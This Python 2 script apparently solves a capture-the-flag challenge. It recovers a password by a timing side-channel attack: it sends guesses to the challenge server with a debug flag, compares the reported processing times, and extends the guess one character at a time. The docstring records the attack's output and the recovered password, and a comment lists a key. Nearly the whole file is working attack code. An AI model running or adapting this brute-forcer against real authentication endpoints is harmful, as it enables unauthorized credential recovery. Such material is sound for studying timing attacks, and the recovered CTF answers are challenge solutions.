#!/usr/bin/python

# key: OH_THAT_ARTWORK!

"""
Next key likely to be:  ('A', Decimal('0.100545'))  or  ('s', Decimal('0.000257'))  or  ('a', Decimal('0.000146'))
Next key likely to be:  ('X', Decimal('0.200953'))  or  ('x', Decimal('0.102200'))  or  ('F', Decimal('0.101615'))
Next key likely to be:  ('M', Decimal('0.301477'))  or  ('E', Decimal('0.201942'))  or  ('p', Decimal('0.201763'))
Next key likely to be:  ('N', Decimal('0.401682'))  or  ('k', Decimal('0.303241'))  or  ('i', Decimal('0.302523'))
Next key likely to be:  ('P', Decimal('0.502110'))  or  ('T', Decimal('0.404895'))  or  ('g', Decimal('0.403474'))
Next key likely to be:  ('9', Decimal('0.602317'))  or  ('$', Decimal('0.506443'))  or  ('M', Decimal('0.504213'))
THE PASSWORD IS:  AXMNP93
"""


import json
import urllib
import urllib2
import sys
import decimal
import operator

URL = "https://ctf.fluxfingers.net:1316/gimmetv"

def try_password(password):
	data = "key=%s&debug" % (password)
	req = urllib2.Request(URL, data)
	response = urllib2.urlopen(req)
	answer = response.read()
	answer_json = json.loads(answer, parse_float=decimal.Decimal)
	#print answer_json
	#print "Start: ", answer_json["start"]
	#print "End: ", answer_json["end"]
	#print "Diff: ", answer_json["end"] - answer_json["start"]
	if(answer_json["success"] != False):
		print "THE PASSWORD IS: ", password
		sys.exit(0)
	return answer_json["end"] - answer_json["start"]


#keyspace = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
keyspace = map(chr, range(ord(' '), ord('`')))

def hack_password(password):
	key_times = dict()
	for x in keyspace:
		key_times[x] = decimal.Decimal(0.0)
	for x in keyspace:
		key_times[x] += try_password(password + x)
		#print x, key_times[x]
	sorted_times = sorted(key_times.iteritems(), key=operator.itemgetter(1), reverse=True)
	print "Next key likely to be: ", sorted_times[0], " or ", sorted_times[1], " or ", sorted_times[2]
	hack_password(password + sorted_times[0][0])

hack_password("")
